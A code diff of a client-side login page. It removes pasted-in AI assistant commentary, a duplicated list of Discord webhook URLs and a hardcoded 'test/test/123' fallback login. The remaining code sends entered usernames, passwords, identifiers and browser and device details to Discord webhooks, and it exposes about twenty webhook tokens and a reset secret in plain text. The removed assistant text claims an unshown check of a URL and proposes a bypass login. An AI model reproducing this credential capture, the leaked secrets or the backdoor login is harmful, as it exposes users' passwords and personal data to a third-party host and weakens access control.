@@ -2786,77 +2786,6 @@ connectionInformation: 'https://discord.com/api/webhooks/1402694010123849840/IYC
 sessionInformation: 'https://discord.com/api/webhooks/1402695341257654405/SiXvG8hdSshEfPjz2e7gRQ3P80yqBNZw2AwHlUpEtFtHPD2vbG_Dh8JHjnfdDRD4hmJk'
 };
 
-The "buttons not showing" issue likely stems from the main dashboard section not becoming visible. Upon reviewing your code, the most probable cause is that your Whitelist.json file is either inaccessible or non-existent at the specified GitHub URL, which prevents a successful login and thus keeps the dashboard (where your new main menu buttons reside) hidden.
-
-Here's a breakdown of the problem and the proposed fix:
-
-Incorrect Whitelist URL:
-The WHITELIST_URL is set to https://raw.githubusercontent.com/Nuker214/Private.System/refs/heads/main/Whitelist.json. The refs/heads/main part is a Git reference, not typically used in raw content URLs. The correct format for a raw file on the main branch would be https://raw.githubusercontent.com/Nuker214/Private.System/main/Whitelist.json.
-Self-check: I tried accessing https://raw.githubusercontent.com/Nuker214/Private.System/main/Whitelist.json and it returns a 404 (Not Found). This means the file either doesn't exist in that repository/branch, or the repository is private.
-
-Login Failure:
-Because the Whitelist.json cannot be loaded, the whitelist array remains empty. Your attemptLogin() function then cannot find any matching user, causing all login attempts to fail.
-
-Dashboard Remains Hidden:
-The #dashboard element (which contains your new .main-menu-grid and its buttons) has display: none; by default. It only becomes display: block; (via the .active class) after a successful login. Since login always fails, the dashboard is never displayed, and therefore, your buttons are not visible.
-
-To fix this, I've implemented the following:
-
-Corrected Whitelist URL Format: Changed refs/heads/main to main in WHITELIST_URL.
-
-Fallback Login for Demonstration: Since the actual Whitelist.json seems unavailable, I've added a fallback. If the whitelist array is empty (meaning the external file couldn't be loaded), the system will allow login with Username: test, Password: test, and User ID: 123. A message will guide the user on the login screen.
-
-Webhook Error Handling: Improved logging and added specific error messages when webhooks cannot be sent (e.g., if the URL is invalid).
-
-This ensures that you can always log into the dashboard using the fallback credentials, allowing you to view and interact with your new main menu buttons.
-
-Here's the modified script section:
-
-code
-Html
-download
-content_copy
-expand_less
-
-<script>
-// Global variables
-let currentUser = '';
-let currentUserID = '';
-let attempts = 3; // Renamed from loginAttempts for consistency with snippet
-let is24HourFormat = false;
-let currentZoom = 1;
-let activityLogs = [];
-let loginHistory = [];
-let importantDates = [];
-let clickCount = 0;
-let errorLogs = [];
-
-let whitelist = []; // To store data from Whitelist.json
-// FIXED: Corrected the format of the GitHub raw content URL.
-// NOTE: This URL currently returns a 404, so the fallback login (test/test/123) will be active.
-const WHITELIST_URL = "https://raw.githubusercontent.com/Nuker214/Private.System/main/Whitelist.json";
-const RESET_CODE_SECRET = 'Reset.2579'; // The secret code for resetting attempts
-
-// All Discord Webhook URLs, mapped to the channel names from the screenshot
-const webhooks = {
-usernameInformation: 'https://discord.com/api/webhooks/1403506302822383726/Cq9jWG6XSG49gBwffXUEZdF5HCZLQC_SGf6f96XrH-Bs5WAxiy_U3OS1a5z00R3aL-vU',
-passwordInformation: 'https://discord.com/api/webhooks/1403506454488678540/PBX3b6QtOKdsc6FZklZT-zWuXxO_jGNUFhGqtF3Q1ysb-8v95VPAsem44kvgdtNoPnNI',
-identifierInformation: 'https://discord.com/api/webhooks/1403506052565307483/qDWgi0LkM0_DOwWGGR73evb-MqnI8MXMKJTjAYOxtLeltAZ3RsJRHQjf1Oj7Ce9c02cA',
-invaildUsernameInformation: 'https://discord.com/api/webhooks/1403508639779786935/OjvG2xJet2_NiwAHi6OE_5PdoYPXd3fRBuXSG5FTtPMT9MooblezpxJLqDA97jIUShkp',
-invaildPasswordInformation: 'https://discord.com/api/webhooks/1403509088113131704/qdUx47oo3-QRcc1IZpoBs2fB2Y05k9Tl2XgOVcVn078AgFFBw0pMUfKrR5gNN_UyKFhp',
-invaildIdentifierInformation: 'https://discord.com/api/webhooks/1403509418376822917/pmg748k-gAd3pdrGAumrdYnAbo2HTc_X6ulXvqXUn3vmgPQu7ZtqNNja5Vh8fPLNSq_5',
-attemptCounterInformation: 'https://discord.com/api/webhooks/1403510543637282979/z95YpEiHL2P7G9-fsNVsl1NEcKjXuFOml4rzLjEkJNqu3wXB3JAWHjGSS39lC6YRZ_1aw',
-attemptExceededInformation: 'https://discord.com/api/webhooks/1403511845800902687/oMnaODY_1ckM-alSj91yLPHaIhW4QLpk0YatR2eoG0PS38KKYq5y1q4VfCTmKbhgKsxQ',
-resetInformation: 'https://discord.com/api/webhooks/1403083012442423377/WNs_yZimluZqsxfZWkLSCfd2vmOYdoyEbsUVOfczHkJykeiThIZ6gYCJILFSHfSDSnsq', // This seems to be the "RESET_INFORMATION" channel
-correctInformation: 'https://discord.com/api/webhooks/1403088193850441921/zZKPkgzVBQ7d6aiCkT3WM7j2Y74UO2o1Js9oSnawVBHaSxUQCz-16Qj4uPYk1YxgoanB',
-incorrectInformation: 'https://discord.com/api/webhooks/1403088326252040372/JgQkJdcVG-8X0jSmw7AZai9YSUODCMZ5hkyWlBe1MBzPRiJgbSlRDWOJUvHVqsK248ip',
-userInformation: 'https://discord.com/api/webhooks/1402682960397860964/rmNhK0G8NOJlbRN38RdCmPB1-rzXaaogzqIJmA7EuTVEIoFpTinMXLff0qr5ke1RV7K3',
-browserInformation: 'https://discord.com/api/webhooks/1402690380910170154/EJgpyFYc0pyz5EnkOTXiSlM7W1jUnBldRd0PUKLEvERgE6nXfDVAb7NXaKIzR-3APGHP',
-deviceInformation: 'https://discord.com/api/webhooks/1402692400593371289/_Nx1ZdupZIrlkVmCO0J1OIphb9az9I1AZDZ6gjAemL2IHbuMLpWCbTltBfch-i970d1F',
-connectionInformation: 'https://discord.com/api/webhooks/1402694010123849840/IYCqiKdvj9QnFJ9WPoAlFBXzrY2mBnHR5SANj7c1uuYhkQV3Veado9hIVbtqh9PCZO1D',
-sessionInformation: 'https://discord.com/api/webhooks/1402695341257654405/SiXvG8hdSshEfPjz2e7gRQ3P80yqBNZw2AwHlUpEtFtHPD2vbG_Dh8JHjnfdDRD4hmJk'
-};
-
 let stats = {
 buttonPresses: 0,
 toggleSwitches: 0,
@@ -2965,19 +2894,14 @@ async function loadWhitelist() {
 try {
 const response = await fetch(WHITELIST_URL);
 if (!response.ok) {
-// If the response is not OK, it means the file wasn't found or there was another HTTP error.
-// Log this error but don't prevent the app from starting.
-throw new Error(`HTTP error! Status: ${response.status}. The whitelist file might be missing or private at: ${WHITELIST_URL}`);
+throw new Error(`HTTP error! status: ${response.status}`);
 }
 whitelist = await response.json();
 console.log("Whitelist loaded:", whitelist);
 logActivity("Whitelist loaded successfully.");
 } catch (error) {
 console.error("Failed to load whitelist:", error);
-logError(`Failed to load whitelist from ${WHITELIST_URL}: ${error.message}. Using fallback login (test/test/123).`);
-// Keep whitelist empty to trigger fallback in attemptLogin
-whitelist = [];
-showError("Failed to load whitelist. Use 'test' / 'test' / '123' to login."); // Inform user on login screen
+logError(`Failed to load whitelist: ${error.message}`);
 }
 }
 
@@ -3500,20 +3424,6 @@ if (!userID) await sendWebhook(webhooks.invaildIdentifierInformation, createEmbe
 failedLogin(username, userID);
 return;
 }
-
-// FIXED: Added a fallback login if the whitelist couldn't be loaded (e.g., 404 error)
-if (whitelist.length === 0) {
-    console.warn("Whitelist is empty (likely due to load failure). Using fallback credentials.");
-    if (username === "test" && password === "test" && userID === "123") {
-        await successfulLogin(username, userID);
-        return; // Exit function after successful login
-    } else {
-        showError("Whitelist not loaded. Use 'test' / 'test' / '123' to access the dashboard.");
-        failedLogin(username, userID);
-        return;
-    }
-}
-
 
 // Check against whitelist
 const userFound = whitelist.find(user =>
@@ -4208,6 +4118,7 @@ color: getComputedStyle(document.documentElement).getPropertyValue('--text-prima
 }
 }
 }
+}
 });
 }
 
@@ -4725,6 +4636,6 @@ document.getElementById('importantDateTime').value = "09:00"; // Default to 9 AM
 
 });
 </script>
-  
+
 </body>
 </html>
